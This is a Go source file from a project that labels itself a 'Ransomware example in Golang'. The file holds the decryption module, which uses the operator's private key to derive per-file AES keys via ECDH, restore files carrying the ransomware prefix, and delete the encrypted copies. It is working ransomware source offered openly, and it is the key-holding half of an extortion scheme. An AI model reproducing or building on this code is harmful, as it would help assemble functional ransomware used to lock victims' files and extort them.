/*
Ransomware example in Golang
Copyright (C) 2017 Gustavo Henrique

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/
package cryptography

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"encoding/hex"
	"errors"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"strings"
)

var serverPrivateKey *ecdsa.PrivateKey

func DecryptDir(dirPath string, config ServerConfig) error {
	serverPrivateKeyBigNum, err := hex.DecodeString(config.PrivKey.D)
	if err != nil {
		return err
	}

	serverPrivateKey = new(ecdsa.PrivateKey)
	serverPrivateKey.D = new(big.Int).SetBytes(serverPrivateKeyBigNum)

	err = filepath.Walk(dirPath, WalkFuncDecorator(decryptFile))
	if err != nil {
		return err
	}
	return nil
}

func extractFileInfo(header []byte) (*CipheredFileInfo, error) {
	text := string(header)
	elts := strings.Split(text, ".")
	if len(elts) < 3 {
		return nil, errors.New("Invalid file header")
	}

	xBytes, err := hex.DecodeString(elts[0])
	if err != nil {
		return nil, err
	}
	x := new(big.Int).SetBytes(xBytes)
	yBytes, err := hex.DecodeString(elts[1])
	if err != nil {
		return nil, err
	}
	y := new(big.Int).SetBytes(yBytes)

	pubkeyCurve := elliptic.P256() //see http://golang.org/pkg/crypto/elliptic/#P256
	pubKey := new(ecdsa.PublicKey)
	pubKey.X = x
	pubKey.Y = y
	pubKey.Curve = pubkeyCurve

	lastIndex := strings.LastIndex(text, elts[1])
	lastIndex += len(elts[1]) + 1

	paddingLen := 16 - (lastIndex % 16)
	lastIndex += paddingLen

	if lastIndex > len(text) {
		return nil, errors.New("Unexpected header")
	}

	return &CipheredFileInfo{
		PubKey:    pubKey,
		HeaderLen: lastIndex,
	}, nil

}

func unpad(in []byte) []byte {
	if len(in) == 0 {
		return nil
	}

	padding := in[len(in)-1]
	if int(padding) > len(in) || padding > aes.BlockSize {
		return nil
	} else if padding == 0 {
		return nil
	}

	for i := len(in) - 1; i > len(in)-int(padding)-1; i-- {
		if in[i] != padding {
			return nil
		}
	}
	return in[:len(in)-int(padding)]
}

func decryptFile(path string, fi os.FileInfo, err error) error {
	if fi.IsDir() {
		return nil
	}

	if !strings.HasPrefix(fi.Name(), RSW_PREFIX) {
		return nil
	}

	srcFile, err := os.Open(path)

	if err != nil {
		return err
	}

	defer srcFile.Close()

	baseDir := filepath.Dir(path)
	outFilePath := filepath.Join(baseDir, fi.Name()[len(RSW_PREFIX):])

	outFile, err := os.Create(outFilePath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	headerParsed := false

	var aesBlockMode cipher.BlockMode

	buffer := make([]byte, 1024)
	for {
		n, err := srcFile.Read(buffer)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		if !headerParsed {
			headerInfo, err := extractFileInfo(buffer[:n])
			if err != nil {
				return err
			}
			headerParsed = true
			if n <= headerInfo.HeaderLen {
				break
			}
			cSymK, _ := GenSharedKey(serverPrivateKey, headerInfo.PubKey)
			aesBlockMode, err = GetCipherBlockMode(cSymK, DECRYPT_MODE)
			if err != nil {
				return err
			}
			if n == 1024 {
				remainingBytes := make([]byte, headerInfo.HeaderLen)
				n, err = srcFile.Read(remainingBytes)
				if err != nil && err != io.EOF {
					return err
				}
				buffer = append(buffer[headerInfo.HeaderLen:1024], remainingBytes[:n]...)
				n = len(buffer)
			} else {
				buffer = buffer[headerInfo.HeaderLen:n]
			}
			n = len(buffer)
		}

		plainData := make([]byte, len(buffer[:n]))
		aesBlockMode.CryptBlocks(plainData, buffer[:n])
		if len(plainData) < 1024 {
			plainData = unpad(plainData)
		}

		_, err = outFile.Write(plainData)

		if err != nil {
			return err
		}
	}

	srcFile.Close()
	outFile.Close()
	err = CopyFileMetadata(fi, outFilePath)
	if err != nil {
		return err
	}

	os.Remove(path)
	if err != nil {
		return err
	}
	return nil
}
